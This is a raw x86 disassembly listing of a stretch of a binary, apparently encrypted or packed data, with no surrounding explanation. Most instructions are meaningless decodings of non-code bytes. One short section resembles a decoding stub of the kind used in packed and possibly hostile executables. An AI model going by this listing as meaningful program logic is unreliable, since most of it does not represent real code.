  41e27b:	imul   esi,DWORD PTR [edi+ecx*2-0x72],0x733269d0
  41e283:	mov    cl,0x7f
  41e285:	xchg   ebp,eax
  41e286:	sbb    ebp,edx
  41e288:	xchg   edx,eax
  41e289:	jne    0x41e2c4
  41e28b:	arpl   WORD PTR [edx+eiz*2+0x2e],si
  41e28f:	adc    al,ah
  41e291:	or     dl,bl
  41e293:	adc    BYTE PTR [edi-0x58eae9f5],0x1b
  41e29a:	jp     0x41e263
  41e29c:	inc    ebx
  41e29d:	sub    al,bh
  41e29f:	jmp    0x5af0e73b
  41e2a4:	ficomp DWORD PTR [ebx-0x2e75a15e]
  41e2aa:	xor    BYTE PTR [esi+ecx*1-0x25991d09],0x20
  41e2b2:	mov    dl,0xdb
  41e2b4:	imul   esi,DWORD PTR [ebp+0x20a301b6],0x520c6ec7
  41e2be:	dec    esp
  41e2bf:	aad    0x9d
  41e2c1:	inc    ebp
  41e2c2:	cmp    esp,DWORD PTR [eax]
  41e2c4:	test   eax,0xb57f6c4a
  41e2c9:	jnp    0x41e31f
  41e2cb:	jae    0x41e287
  41e2cd:	pop    ss
  41e2ce:	pop    eax
  41e2cf:	pop    ecx
  41e2d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2d1:	loope  0x41e34d
  41e2d3:	add    cl,BYTE PTR [esi+0x16918e0d]
  41e2d9:	or     BYTE PTR [ecx-0x3feabda9],dh
  41e2df:	push   cs
  41e2e0:	pop    esp
  41e2e1:	mov    edi,0x46a92fc7
  41e2e6:	mov    esp,esp
  41e2e8:	mov    eax,ds:0x723fc908
  41e2ed:	rcr    bl,cl
  41e2ef:	push   ds
  41e2f0:	cs inc edx
  41e2f2:	mov    dh,0x58
  41e2f4:	push   edi
  41e2f5:	imul   esi,DWORD PTR [ecx+ebp*8],0xc83d67fb
  41e2fc:	or     al,0x3f
  41e2fe:	dec    edi
  41e2ff:	push   ecx
  41e300:	push   cs
  41e301:	push   ecx
  41e302:	test   BYTE PTR [eax],dh
  41e304:	stos   DWORD PTR es:[edi],eax
  41e305:	inc    ebp
  41e306:	mov    fs,ecx
  41e308:	(bad)  
  41e309:	clc    
  41e30a:	inc    edx
  41e30b:	add    DWORD PTR [ecx+0x25],ebx
  41e30e:	fld    DWORD PTR [ebx]
  41e310:	mov    DWORD PTR [eax+0xf],esi
  41e313:	inc    edx
  41e314:	je     0x41e391
  41e316:	xlat   BYTE PTR ds:[ebx]
  41e317:	or     esp,DWORD PTR [ebx]
  41e319:	jno    0x41e2af
  41e31b:	xor    eax,0xdfc6f10e
  41e320:	dec    ebx
  41e321:	sub    eax,0x194d24cd
  41e326:	or     eax,0xda579e0e
  41e32b:	pop    edx
  41e32c:	or     ah,cl
  41e32e:	retf   
  41e32f:	pop    es
  41e330:	aad    0xa0
  41e332:	xchg   edi,eax
  41e333:	sub    DWORD PTR [ecx-0x30],eax
  41e336:	and    edi,ecx
  41e338:	add    DWORD PTR [eax],eax
  41e33a:	inc    edx
  41e33b:	xor    ah,dh
  41e33d:	pop    edx
  41e33e:	ins    BYTE PTR es:[edi],dx
  41e33f:	xlat   BYTE PTR ds:[ebx]
  41e340:	lahf   
  41e341:	stc    
  41e342:	adc    ecx,DWORD PTR [esi-0x14e7a272]
  41e348:	pop    esp
  41e349:	jmp    0x88f7:0x28eb7086
  41e350:	jnp    0x41e2fa
  41e352:	call   0x8d60fdfb
  41e357:	mov    ecx,0xe82df497
  41e35c:	inc    ecx
  41e35d:	int3   
  41e35e:	int3   
  41e35f:	ror    BYTE PTR gs:[edi-0x13],cl
  41e363:	jo     0x41e383
  41e365:	test   BYTE PTR [ecx-0x36],0xf7
  41e369:	test   BYTE PTR ds:[esi-0x23895d6c],dh
  41e370:	jmp    0xab2cf5dd
  41e375:	rcr    BYTE PTR [edx],cl
  41e377:	jle    0x41e369
  41e379:	xor    eax,0x1e13fb8c
  41e37e:	ss cmp ecx,edi
  41e381:	sub    edi,DWORD PTR [ecx+0x2a1ea5a8]
  41e387:	sar    BYTE PTR [ecx+0x7b79b0b8],cl
  41e38d:	push   0x5c
  41e38f:	xor    DWORD PTR [edi],esi
  41e391:	dec    edx
  41e392:	bound  ebx,QWORD PTR [ebx-0x2b9c25e6]
  41e398:	cmp    al,0x33
  41e39a:	add    al,0x29
  41e39c:	jmp    0x41e36c
  41e39e:	adc    DWORD PTR [esi],ecx
  41e3a0:	add    eax,0x37a358a8
  41e3a5:	pusha  
  41e3a6:	dec    esi
  41e3a7:	push   ecx
  41e3a8:	aam    0xb
  41e3aa:	push   edi
  41e3ab:	lea    ebp,[esi+0x64]
  41e3ae:	out    0x3f,eax
  41e3b0:	faddp  st(2),st
  41e3b2:	aad    0xef
  41e3b4:	jns    0x41e38c
  41e3b6:	pop    es
  41e3b7:	dec    esi
  41e3b8:	pop    es
  41e3b9:	int3   
  41e3ba:	add    edx,DWORD PTR [esi-0x5c]
  41e3bd:	arpl   WORD PTR [ebx],ax
  41e3bf:	shr    DWORD PTR [ebp-0x7e54929a],cl
  41e3c5:	jl     0x41e37a
  41e3c7:	stos   DWORD PTR es:[edi],eax
  41e3c8:	cld    
  41e3c9:	mov    esi,0x208876ce
  41e3ce:	mov    ds:0xea79bbff,al
  41e3d3:	outs   dx,DWORD PTR ds:[esi]
  41e3d4:	add    ecx,0x46683849
  41e3da:	ficomp WORD PTR [ebx-0x290c556f]
  41e3e0:	dec    edx
  41e3e1:	inc    ebx
  41e3e2:	aas    
  41e3e3:	sub    eax,0x52e381d9
  41e3e8:	xor    DWORD PTR [ebp-0x69118f10],eax
  41e3ee:	pop    ebx
  41e3ef:	cmp    dh,0x33
  41e3f2:	dec    ecx
  41e3f3:	test   al,0x99
  41e3f5:	jecxz  0x41e3bf
  41e3f7:	adc    eax,0x6d9b37eb
  41e3fc:	cwde   
  41e3fd:	jo     0x41e3e6
  41e3ff:	js     0x41e403
  41e401:	popf   
  41e402:	out    0x59,eax
  41e404:	scas   al,BYTE PTR es:[edi]
  41e405:	adc    ch,cl
  41e407:	xor    al,0xad
  41e409:	push   cs
  41e40a:	fcomi  st,st(7)
  41e40c:	mov    ecx,0xe8d50a0e
  41e411:	bound  ebx,QWORD PTR [esi]
  41e413:	fmulp  st(6),st
  41e415:	mov    edi,0x5ccb1279
  41e41a:	push   eax
  41e41b:	mov    bh,0xda
  41e41d:	push   ecx
  41e41e:	aas    
  41e41f:	fadd   DWORD PTR [esi-0x57]
  41e422:	test   DWORD PTR [edi+0x4c],esp
  41e425:	sbb    eax,DWORD PTR [esi+0x2f6af6eb]
  41e42b:	mov    eax,ds:0xbaed2da7
  41e430:	mov    ebx,0x3b6c67df
  41e435:	inc    eax
  41e436:	mov    ds:0x28c6a704,al
  41e43b:	out    0xd0,eax
  41e43d:	shl    esi,1
  41e43f:	mov    ds:0xccd31de4,eax
  41e444:	(bad)  
  41e445:	pop    edi
  41e446:	xor    al,0x21
  41e448:	neg    BYTE PTR [ebx+0x2a]
  41e44b:	sar    BYTE PTR [esi-0x8],0x60
  41e44f:	push   0x89cf514d
  41e454:	adc    cl,BYTE PTR [edi+eiz*2+0x67]
  41e458:	bound  esi,QWORD PTR [eax+0x15731708]
  41e45e:	pop    edi
  41e45f:	mov    ebx,0xd2a4ff2e
  41e464:	outs   dx,BYTE PTR ds:[esi]
  41e465:	mov    ecx,0x8d17ba3e
  41e46a:	sbb    cl,BYTE PTR [ebx+eiz*1]
  41e46d:	sbb    al,0x9f
  41e46f:	pmaxsw mm7,QWORD PTR [eax+eax*2+0x16fe96e9]
  41e477:	(bad)  
  41e478:	out    dx,al
  41e479:	lahf   
  41e47a:	mov    ecx,0x3f6198bc
  41e47f:	or     eax,0x3aa01cfb
  41e484:	or     BYTE PTR [eax+0x62fb6a2f],dh
  41e48a:	and    al,0xb2
  41e48c:	leave  
  41e48d:	lock jo 0x41e47d
  41e490:	lock jno 0x41e460
  41e493:	outs   dx,DWORD PTR ds:[esi]
  41e494:	fsubr  DWORD PTR ds:0x6a7759dd
  41e49a:	ror    BYTE PTR [ebx],cl
  41e49c:	mov    eax,0x1429f951
  41e4a1:	shr    BYTE PTR [ebx+eax*4-0x19a393b2],0x71
  41e4a9:	mov    esp,DWORD PTR [ecx]
  41e4ab:	aam    0xc8
  41e4ad:	mov    ds:0x6224b3d,eax
  41e4b2:	fsub   QWORD PTR [esi-0x21845cfe]
  41e4b8:	xchg   ebx,eax
  41e4b9:	inc    eax
  41e4ba:	or     bl,BYTE PTR [eax+0x35]
  41e4bd:	(bad)  
  41e4be:	sahf   
  41e4bf:	(bad)  
  41e4c0:	ret    
  41e4c1:	adc    DWORD PTR [edi+0x6ade0f92],0x1c3a3c
  41e4cb:	dec    eax
  41e4cc:	test   DWORD PTR [edi],ebp
  41e4ce:	xor    DWORD PTR [edx],ebp
  41e4d0:	lea    eax,[eax+ebx*2+0x6de7974c]
  41e4d7:	cmc    
  41e4d8:	call   0x1c2f:0x2b5738fd
  41e4df:	mov    eax,ds:0x4fa9da0d
  41e4e4:	fcomi  st,st(6)
  41e4e6:	push   es
  41e4e7:	rcr    DWORD PTR [edx+0x35],cl
  41e4ea:	cdq    
  41e4eb:	daa    
  41e4ec:	loopne 0x41e4a1
  41e4ee:	icebp  
  41e4ef:	leave  
  41e4f0:	or     eax,ecx
  41e4f2:	test   al,0xfb
  41e4f4:	push   ecx
  41e4f5:	cmp    esi,DWORD PTR [edi-0x2b]
  41e4f8:	and    eax,0xacd95759
  41e4fd:	cmp    BYTE PTR [ecx],cl
  41e4ff:	xchg   ebx,eax
  41e500:	out    dx,al
  41e501:	xchg   ebx,eax
  41e502:	fwait
  41e503:	xchg   ecx,eax
  41e504:	sub    ch,BYTE PTR [eax+0x22]
  41e507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e508:	mov    ch,0xfd
  41e50a:	pop    ebx
  41e50b:	sbb    BYTE PTR [eax+0xf456a04],dl
  41e511:	push   es
  41e512:	inc    esp
  41e513:	or     ebx,DWORD PTR [ecx+0x2fb116b8]
  41e519:	adc    ah,ch
  41e51b:	push   eax
  41e51c:	pop    ebp
  41e51d:	fmul   QWORD PTR [edi]
  41e51f:	cmp    BYTE PTR [ebp+0x5b],ch
  41e522:	jno    0x41e582
  41e524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e525:	adc    eax,0x75c2b63f
  41e52a:	inc    eax
  41e52b:	jmp    0x33230ce3
  41e530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e531:	adc    al,0x5f
  41e533:	inc    ebp
  41e534:	fiadd  DWORD PTR [ebx-0x6c2edb0a]
  41e53a:	sub    DWORD PTR [ebp+0x587aa8f5],esi
  41e540:	mov    al,0x53
  41e542:	bound  edx,QWORD PTR [esi+ebp*4-0x4530acb0]
  41e549:	(bad)  
  41e54a:	xchg   edi,eax
  41e54b:	sbb    DWORD PTR [eax],eax
  41e54d:	out    0x75,eax
  41e54f:	call   0xfcb6:0xd4744613
  41e556:	repz jle 0x41e511
  41e559:	out    0xc3,al
  41e55b:	inc    edx
  41e55c:	imul   esi,DWORD PTR fs:[ecx+0x41],0xffffff92
  41e561:	and    edx,ebx
  41e563:	sbb    eax,0x980981cc
  41e568:	fcomp  st(1)
  41e56a:	jmp    0xe2ae:0xce3f2259
  41e571:	int    0x1d
  41e573:	dec    esp
  41e574:	jnp    0x41e52b
  41e576:	std    
  41e577:	jne    0x41e577
  41e579:	and    DWORD PTR [esi+0x4f19d4e6],0xef9f3ac2
  41e583:	lock cmp DWORD PTR [edx+0x49],esp
  41e587:	bound  eax,QWORD PTR ds:0x95ba03e8
  41e58d:	xchg   esi,eax
  41e58e:	lea    esp,[ebp+0x67f4761]
  41e594:	push   ss
  41e595:	cmp    BYTE PTR [ebx+0x6dddf9b],0x7d
  41e59c:	mov    ax,WORD PTR [esi-0x4443f1bb]
  41e5a3:	pop    esi
  41e5a4:	(bad)  
  41e5a5:	addr16 push edi
  41e5a7:	push   edi
  41e5a8:	fst    QWORD PTR [esp+eax*2-0x4e]
  41e5ac:	hlt    
  41e5ad:	push   es
  41e5ae:	sbb    eax,0xa1f0390b
  41e5b3:	pop    ecx
  41e5b4:	sahf   
  41e5b5:	gs jl  0x41e5d0
  41e5b8:	mul    DWORD PTR [eax]
  41e5ba:	mov    ?,edx
  41e5bc:	pop    ss
  41e5bd:	daa    
  41e5be:	inc    ecx
  41e5bf:	jmp    DWORD PTR fs:[ecx+0x25]
  41e5c3:	int3   
  41e5c4:	xchg   esi,eax
  41e5c5:	repz mov gs,edi
  41e5c8:	xor    BYTE PTR [ecx+0x65],al
  41e5cb:	cld    
  41e5cc:	jbe    0x41e5b4
  41e5ce:	test   al,0xda
  41e5d0:	pop    esp
  41e5d1:	loope  0x41e5ad
  41e5d3:	icebp  
  41e5d4:	pop    ss
  41e5d5:	pop    esp
  41e5d6:	hlt    
  41e5d7:	xchg   ecx,eax
  41e5d8:	cs inc eax
  41e5da:	pop    ss
  41e5db:	fcmove st,st(3)
  41e5dd:	adc    ecx,esi
  41e5df:	inc    ecx
  41e5e0:	data16 mov dh,0x67
  41e5e3:	push   ecx
  41e5e4:	adc    BYTE PTR [ebx-0x6299c53],0x9a
  41e5eb:	es retf 0x8f03
  41e5ef:	addr16 (bad) 
  41e5f1:	sar    BYTE PTR [esi+0x73],1
  41e5f4:	and    al,0xcb
  41e5f6:	popf   
  41e5f7:	add    al,0x6a
  41e5f9:	scas   eax,DWORD PTR es:[edi]
  41e5fa:	pusha  
  41e5fb:	dec    ebx
  41e5fc:	lods   al,BYTE PTR ds:[esi]
  41e5fd:	adc    DWORD PTR [esi-0x72],edx
  41e600:	dec    edi
  41e601:	xchg   DWORD PTR [edx+0x1425dd1f],edi
  41e607:	ror    DWORD PTR [edi],cl
  41e609:	loope  0x41e597
  41e60b:	push   eax
  41e60c:	out    dx,eax
  41e60d:	jae    0x41e5ff
  41e60f:	ins    DWORD PTR es:[edi],dx
  41e610:	lea    ebp,[esi+0x62]
  41e613:	jmp    0x1b14c0ee
  41e618:	mov    ecx,0x56bf5d18
  41e61d:	fwait
  41e61e:	sbb    al,0x26
  41e620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e621:	xchg   ecx,eax
  41e622:	mov    ebp,0x88aff9e2
  41e627:	enter  0x9e43,0x69
  41e62b:	xor    DWORD PTR [esi+0x5e],ecx
  41e62e:	xchg   ebp,eax
  41e62f:	lods   al,BYTE PTR ds:[esi]
  41e630:	imul   esp,DWORD PTR [ecx+0x2dad0570],0xffffffb3
  41e637:	sbb    eax,0xe44fd47
  41e63c:	ja     0x41e609
  41e63e:	out    dx,al
  41e63f:	ror    BYTE PTR [eax],cl
  41e641:	aaa    
  41e642:	sub    BYTE PTR [edx-0x27],dh
  41e645:	out    dx,eax
  41e646:	adc    dl,BYTE PTR [ebp+esi*1+0x8010dda]
  41e64d:	(bad)  
  41e64e:	xchg   ecx,eax
  41e64f:	int3   
  41e650:	push   ecx
  41e651:	pop    ecx
  41e652:	pop    edi
  41e653:	jge    0x41e67d
  41e655:	inc    esp
  41e656:	popf   
  41e657:	sbb    ebx,DWORD PTR [edi+0x7f]
  41e65a:	ds popf 
  41e65c:	dec    edi
  41e65d:	pushf  
  41e65e:	jnp    0x41e64b
  41e660:	dec    esp
  41e661:	int3   
  41e662:	repnz inc edx
  41e664:	mov    cl,0x4c
  41e666:	arpl   WORD PTR [eax-0x3b],si
  41e669:	mov    al,0xe
  41e66b:	pusha  
  41e66c:	retf   0x6b49
  41e66f:	and    esp,edx
  41e671:	dec    edx
  41e672:	mov    bl,0xec
  41e674:	adc    esi,DWORD PTR ds:0x26ea5266
  41e67a:	test   DWORD PTR [esp+eax*4-0x6c],eax
  41e67e:	inc    eax
  41e67f:	fs sar edi,1
  41e682:	aad    0xbe
  41e684:	retf   
  41e685:	cmp    al,0x80
  41e687:	ja     0x41e691
  41e689:	and    ecx,DWORD PTR [ebx-0x68]
  41e68c:	aam    0x8e
  41e68e:	xchg   esi,eax
  41e68f:	mov    al,0xc
  41e691:	mov    eax,gs:0x6cea348f
  41e697:	aam    0xe4
  41e699:	aaa    
  41e69a:	scas   al,BYTE PTR es:[edi]
  41e69b:	aaa    
  41e69c:	xor    DWORD PTR [edi],esp
  41e69e:	lahf   
  41e69f:	mov    ebp,0x291f3483
  41e6a4:	aam    0x85
  41e6a6:	mov    ecx,0x28e8dda1
  41e6ab:	push   0xff47c769
  41e6b0:	(bad)  
  41e6b1:	icebp  
  41e6b2:	loop   0x41e6b4
  41e6b4:	pop    ebx
  41e6b5:	js     0x41e733
  41e6b7:	loopne 0x41e70a
  41e6b9:	push   esi
  41e6ba:	rol    DWORD PTR [ebx+0x37],cl
  41e6bd:	push   ds
  41e6be:	sbb    BYTE PTR [esp+ebx*8+0x18],ah
  41e6c2:	ja     0x41e68d
  41e6c4:	xchg   esp,eax
  41e6c5:	aam    0x8a
  41e6c7:	lahf   
  41e6c8:	pusha  
  41e6c9:	ret    
  41e6ca:	fs cmp al,0x13
  41e6cd:	pop    ebx
  41e6ce:	jns    0x41e65f
  41e6d0:	jge    0x41e747
  41e6d2:	cmp    DWORD PTR [ebx+0x74b4a285],0xffffffd9
  41e6d9:	jno    0x41e737
  41e6db:	mov    ch,0x56
  41e6dd:	or     eax,0xec4214cf
  41e6e2:	jb     0x41e687
  41e6e4:	mov    dh,0x33
  41e6e6:	call   0x674:0x5d4cca6b
  41e6ed:	jmp    0xd0a5:0xef1a6606
  41e6f4:	fsubr  DWORD PTR [ecx]
  41e6f6:	lods   al,BYTE PTR ds:[esi]
  41e6f7:	inc    edi
  41e6f8:	test   edx,esp
  41e6fa:	(bad)  
  41e6fb:	ja     0x41e6a8
  41e6fd:	into   
  41e6fe:	das    
  41e6ff:	cdq    
  41e700:	or     eax,0xb3122427
  41e705:	inc    edx
  41e706:	mov    edx,0xc4b61a54
  41e70b:	cmp    BYTE PTR [edi+0x44fe85d9],bh
  41e711:	cmc    
  41e712:	(bad)  
  41e713:	in     eax,dx
  41e714:	xchg   ecx,eax
  41e715:	sbb    dh,BYTE PTR [ebp+0x15]
  41e718:	pushf  
  41e719:	cmp    dh,al
  41e71b:	not    ch
  41e71d:	mov    ecx,0x4afbc2e6
  41e722:	or     dl,dl
  41e724:	call   0xe6a4:0xc8e86b32
  41e72b:	push   cs
  41e72c:	stos   BYTE PTR es:[edi],al
  41e72d:	scas   eax,DWORD PTR es:[edi]
  41e72e:	dec    esp
  41e72f:	call   0xd3cd:0xf82c5f4a
  41e736:	jmp    0x41e746
  41e738:	jne    0x41e7b7
  41e73a:	das    
  41e73b:	xchg   esi,eax
  41e73c:	lods   al,BYTE PTR ds:[esi]
  41e73d:	in     al,dx
  41e73e:	adc    ebx,esp
  41e740:	das    
  41e741:	push   ebp
  41e742:	fadd   DWORD PTR [edi]
  41e744:	push   0xf8f61b96
  41e749:	outs   dx,DWORD PTR ds:[esi]
  41e74a:	jmp    0x41e6de
  41e74c:	xchg   DWORD PTR ds:0x88155428,ecx
  41e752:	xchg   edi,eax
  41e753:	mov    dl,0xd5
  41e755:	inc    eax
  41e756:	in     eax,0x9e
  41e758:	idiv   BYTE PTR [esi-0x67]
  41e75b:	gs push ebp
  41e75d:	stc    
  41e75e:	(bad)
  41e761:	pop    ds
  41e762:	sbb    DWORD PTR [ecx+ebx*2],eax
  41e765:	(bad)  
  41e766:	call   DWORD PTR [ebp+0x4f49fd15]
  41e76c:	add    esi,ebp
  41e76e:	gs lahf 
  41e770:	test   al,0xe5
  41e772:	xlat   BYTE PTR ds:[ebx]
  41e773:	adc    DWORD PTR [esi],0xfffffff9
  41e776:	out    0xef,eax
  41e778:	and    esi,DWORD PTR [ebp+0x1b]
  41e77b:	mov    ecx,0xa1312d98
  41e780:	mov    dh,0x6
  41e782:	das    
  41e783:	pop    esi
  41e784:	and    bh,bh
  41e786:	or     edx,edi
  41e788:	sbb    eax,DWORD PTR [edx+0x70]
  41e78b:	mov    esi,0x72b343b5
  41e790:	in     al,0xd6
  41e792:	leave  
  41e793:	out    0x49,al
  41e795:	mov    ch,0x5c
  41e797:	fstp   TBYTE PTR [edx+0x11]
  41e79a:	mov    dl,0xac
  41e79c:	xchg   BYTE PTR [ebx],al
  41e79e:	arpl   WORD PTR [esi-0xf474695],sp
  41e7a4:	adc    al,0x5c
  41e7a6:	push   ss
  41e7a7:	mov    ds:0x6b0280a7,eax
  41e7ac:	(bad)  
  41e7ad:	adc    dl,BYTE PTR [esp+ebp*1]
  41e7b0:	mov    fs,WORD PTR [ebx+ebp*2-0x38cdabfa]
  41e7b7:	outs   dx,BYTE PTR ds:[esi]
  41e7b8:	xor    BYTE PTR [edx-0xd],al
  41e7bb:	cmc    
  41e7bc:	adc    cl,BYTE PTR [esi]
  41e7be:	mov    DWORD PTR [ebx],eax
  41e7c0:	popf   
  41e7c1:	xor    eax,0x79c2f9ee
  41e7c6:	neg    BYTE PTR [edx+ebp*1-0x4ce1d30c]
  41e7cd:	mov    esi,0x48634074
  41e7d2:	dec    esp
  41e7d3:	adc    al,0xaf
  41e7d5:	out    0x32,eax
  41e7d7:	sub    BYTE PTR [eax+eiz*8+0x49],0xf2
  41e7dc:	pop    edx
  41e7dd:	sub    DWORD PTR [ecx+0xf],ecx
  41e7e0:	outs   dx,DWORD PTR ds:[esi]
  41e7e1:	call   0xc9eb:0x2178ad04
  41e7e8:	out    dx,eax
  41e7e9:	fsubr  DWORD PTR [edx+ecx*4]
  41e7ec:	int    0xf8
  41e7ee:	dec    edi
  41e7ef:	xchg   ebx,eax
  41e7f0:	shr    dl,0x60
  41e7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f4:	in     eax,dx
  41e7f5:	xor    al,0x9
  41e7f7:	sar    esi,1
  41e7f9:	(bad)  
  41e7fa:	add    BYTE PTR [ebp+0x49b63304],bh
  41e800:	int3   
  41e801:	or     dl,al
  41e803:	fs mov bh,0x66
  41e806:	sahf   
  41e807:	(bad)  
  41e809:	cdq    
  41e80a:	js     0x41e806
  41e80c:	add    eax,0x58987ee3
  41e811:	push   esi
  41e812:	inc    esi
  41e813:	call   0x996ac3b2
  41e818:	mov    BYTE PTR [ecx-0x63],0xc8
  41e81c:	mov    eax,0x1dc66675
  41e821:	retf   0x85ab
  41e824:	cli    
  41e825:	repz jmp 0x41e851
  41e828:	lods   al,BYTE PTR gs:[esi]
  41e82a:	pop    esp
  41e82b:	jl     0x41e7f9
  41e82d:	test   BYTE PTR [esi+0x40],cl
  41e830:	ins    BYTE PTR es:[edi],dx
  41e831:	push   edi
  41e832:	inc    esi
  41e833:	les    eax,FWORD PTR [ebx]
  41e835:	mov    dh,0xc1
  41e837:	outs   dx,DWORD PTR ds:[esi]
  41e838:	lea    ecx,[ebx]
  41e83a:	jbe    0x41e85d
  41e83c:	sbb    DWORD PTR [edi+0x4],edx
  41e83f:	pop    ss
  41e840:	ins    BYTE PTR es:[edi],dx
  41e841:	hlt    
  41e842:	adc    al,0x51
  41e844:	loop   0x41e864
  41e846:	bound  ebx,QWORD PTR ds:0x32f91328
  41e84c:	ss cld 
  41e84e:	ins    DWORD PTR es:[edi],dx
  41e84f:	out    dx,eax
  41e850:	mov    ecx,0x63486d7f
  41e855:	mov    al,ds:0x48b0312
  41e85a:	adc    BYTE PTR [ecx-0x69],bh
  41e85d:	jle    0x41e802
  41e85f:	in     eax,0x2d
  41e861:	imul   ebx,esp,0xb54c691d
  41e867:	test   DWORD PTR [ebp+ebx*8-0xdf6f1f7],edx
  41e86e:	xchg   edi,eax
  41e86f:	adc    ch,BYTE PTR [ebx-0x34]
  41e872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e873:	xor    DWORD PTR ds:0x459bab49,esp
  41e879:	lods   al,BYTE PTR ds:[esi]
  41e87a:	or     dh,al
  41e87c:	inc    ebx
  41e87d:	mov    eax,ds:0x4539e3db
  41e882:	pusha  
  41e883:	xchg   ecx,eax
  41e884:	mov    dl,0xa3
  41e886:	int    0xf3
  41e888:	add    dl,BYTE PTR [edi-0x20d480eb]
  41e88e:	loopne 0x41e83b
  41e890:	mov    al,ds:0xcc5ad32
  41e895:	jnp    0x41e86f
  41e897:	scas   al,BYTE PTR es:[edi]
  41e898:	jnp    0x41e846
  41e89a:	pushf  
  41e89b:	sbb    esp,0x2a
  41e89e:	out    dx,al
  41e89f:	daa    
  41e8a0:	(bad)
  41e8a4:	call   0x7cf0c2de
  41e8a9:	retf   
  41e8aa:	rol    edi,1
  41e8ac:	ja     0x41e858
  41e8ae:	sub    eax,edi
  41e8b0:	jnp    0x41e891
  41e8b2:	and    eax,0x80927242
  41e8b7:	push   ds
  41e8b8:	push   0x71fad01f
  41e8bd:	sub    ax,0x689e
  41e8c1:	in     al,0x47
  41e8c3:	jecxz  0x41e929
  41e8c5:	add    esp,DWORD PTR [eax]
  41e8c7:	(bad)  
  41e8c8:	cmp    eax,ebx
  41e8ca:	jecxz  0x41e852
  41e8cc:	int3   
  41e8cd:	aaa    
  41e8ce:	(bad)  [eax+ebp*8+0x72]
  41e8d2:	sub    BYTE PTR cs:[ebx],0x15
  41e8d6:	popa   
  41e8d7:	mov    dh,0xc8
  41e8d9:	(bad)  
  41e8da:	ds mov cl,cl
  41e8dd:	clc    
  41e8de:	mov    ds:0xdebd5782,al
  41e8e3:	aad    0xb5
  41e8e5:	adc    DWORD PTR [ebp-0x531a6b74],eax
  41e8eb:	es scas al,BYTE PTR es:[edi]
  41e8ed:	adc    BYTE PTR [edx],cl
  41e8ef:	fdivr  DWORD PTR [edi]
  41e8f1:	les    eax,FWORD PTR [eax]
  41e8f3:	outs   dx,DWORD PTR ds:[esi]
  41e8f4:	xchg   ebp,eax
  41e8f5:	dec    esi
  41e8f6:	mov    edx,0xb0af797
  41e8fb:	fld    TBYTE PTR [eax]
  41e8fd:	mov    edx,0x66def5e2
  41e902:	test   al,0xb8
  41e904:	dec    BYTE PTR [ecx-0x19]
  41e907:	mov    eax,ds:0x7dfcd4b8
  41e90c:	mov    DWORD PTR [edx+eiz*1-0x44],esi
  41e910:	mov    ebx,0x8aa5cdfe
  41e915:	inc    ecx
  41e916:	xchg   BYTE PTR [eax-0x3ef95278],bl
  41e91c:	inc    eax
  41e91d:	lds    esi,FWORD PTR [edi+0x78]
  41e920:	je     0x41e92d
  41e922:	cmp    DWORD PTR [esi],eax
  41e924:	sub    cl,BYTE PTR [edi+0x7f]
  41e927:	dec    esi
  41e928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e929:	cmp    BYTE PTR [edi+0x9782ea8],ah
  41e92f:	mov    esp,0xb9aa366
  41e934:	out    0x0,eax
  41e936:	dec    eax
  41e937:	cli    
  41e938:	push   es
  41e939:	xchg   ebp,eax
  41e93a:	push   edx
  41e93b:	inc    ebx
  41e93c:	jb     0x41e990
  41e93e:	inc    esi
  41e93f:	(bad)  
  41e940:	pop    ss
  41e941:	add    ch,dh
  41e943:	int    0xda
  41e945:	xlat   BYTE PTR ds:[ebx]
  41e946:	push   ebp
  41e947:	xor    DWORD PTR [ebx+0x3335d019],0xffffffd0
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fld DWORD PTR es:[ebp-0x62]
  41e99c:	add    DWORD PTR [eax+0x7a7dc28e],ebp
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41e9e7
  41e9a7:	or     bl,bl
  41e9a9:	adc    eax,0xc7740416
  41e9ae:	mov    al,BYTE PTR [eax]
  41e9b0:	mov    WORD PTR [edx+0x6d3f4fe9],fs
  41e9b6:	dec    edx
  41e9b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b8:	adc    DWORD PTR [edx-0xbdfadd7],esp
  41e9be:	fidiv  DWORD PTR [ebp-0x6a]
  41e9c1:	adc    BYTE PTR [ebx-0x61],bl
  41e9c4:	dec    ebx
  41e9c5:	cdq    
  41e9c6:	xchg   esp,eax
  41e9c7:	dec    ebx
  41e9c8:	adc    eax,0x1b760217
  41e9cd:	dec    edx
  41e9ce:	adc    ebp,DWORD PTR [ecx+0x7e]
  41e9d1:	push   ecx
  41e9d2:	frstor [ecx+0x1c]
  41e9d5:	packsswb mm4,mm6
  41e9d8:	imul   edi,ebx,0xffffff8c
  41e9db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9dc:	sub    BYTE PTR [ebp+0x879cea9],ah
  41e9e2:	enter  0x3306,0x89
  41e9e6:	add    ebp,edi
  41e9e8:	or     dl,BYTE PTR [eax]
  41e9ea:	enter  0xfaa4,0x53
  41e9ee:	mov    ecx,0x535bb7d
  41e9f3:	mov    eax,ds:0x715afd90
